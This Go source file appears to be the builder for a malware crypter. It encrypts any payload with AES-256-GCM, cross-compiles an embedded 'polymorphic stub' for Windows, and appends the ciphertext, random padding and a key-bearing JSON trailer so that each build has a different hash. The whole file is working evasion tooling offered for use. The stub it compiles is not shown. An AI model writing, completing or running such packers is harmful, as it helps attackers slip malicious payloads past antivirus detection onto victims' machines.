package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
)

//go:embed stub.src
var stubSource []byte

const magic = "HBX1"

// metadata is the JSON trailer appended after the ciphertext.
type metadata struct {
	Key           string `json:"key"`
	Nonce         string `json:"nonce"`
	OriginalName  string `json:"original_name"`
	OriginalSize  int    `json:"original_size"`
	CiphertextLen int    `json:"ciphertext_len"`
	StubSize      int    `json:"stub_size"`
}

// generateBinary encrypts the payload, compiles the polymorphic stub,
// and assembles the self-modifying output binary.
//
// Output layout:
//
//	[stub.exe] [random padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
func generateBinary(payloadPath, outputPath string) error {
	// 1. Read the payload.
	plaintext, err := os.ReadFile(payloadPath)
	if err != nil {
		return fmt.Errorf("cannot read %s: %w", payloadPath, err)
	}
	if len(plaintext) == 0 {
		return fmt.Errorf("payload must not be empty")
	}

	// 2. Encrypt with AES-256-GCM.
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("gcm: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))

	// 3. Compile the polymorphic stub for Windows.
	fmt.Println("[INFO] Compiling polymorphic stub for windows/amd64 ...")
	stub, err := compileStub()
	if err != nil {
		return fmt.Errorf("compile stub: %w", err)
	}

	// 4. Random initial padding (1–64 KB).
	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
	padding := make([]byte, 1024+int(padLen.Int64()))
	rand.Read(padding)

	// 5. Build the metadata trailer.
	meta := metadata{
		Key:           base64.StdEncoding.EncodeToString(key),
		Nonce:         base64.StdEncoding.EncodeToString(nonce),
		OriginalName:  filepath.Base(payloadPath),
		OriginalSize:  len(plaintext),
		CiphertextLen: len(ciphertext),
		StubSize:      len(stub),
	}
	metaJSON, _ := json.Marshal(meta)
	metaLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLenBuf, uint32(len(metaJSON)))

	// 6. Assemble output.
	out, err := os.OpenFile(outputPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}
	defer out.Close()

	out.Write(stub)
	out.Write(padding)
	out.Write(ciphertext)
	out.Write(metaJSON)
	out.Write(metaLenBuf)
	out.Write([]byte(magic))

	totalSize := len(stub) + len(padding) + len(ciphertext) + len(metaJSON) + 8

	fmt.Printf("[OK] Polymorphic binary generated successfully as %q.\n", outputPath)
	fmt.Printf("[INFO] Payload:    %s (%d bytes)\n", payloadPath, len(plaintext))
	fmt.Printf("[INFO] Output:     %s (%d bytes)\n", outputPath, totalSize)
	fmt.Println("[INFO] Each run rewrites the binary with a fresh key and random padding, changing its hash.")
	return nil
}

// compileStub cross-compiles the embedded stub source into a Windows .exe.
func compileStub() ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "poly-build-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), stubSource, 0o644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte("module stub\n\ngo 1.21\n"), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(tmpDir, "stub.exe")
	cmd := exec.Command("go", "build", "-o", outPath, "-ldflags", "-s -w", ".")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("go build failed:\n%s\n%w", string(out), err)
	}
	return os.ReadFile(outPath)
}
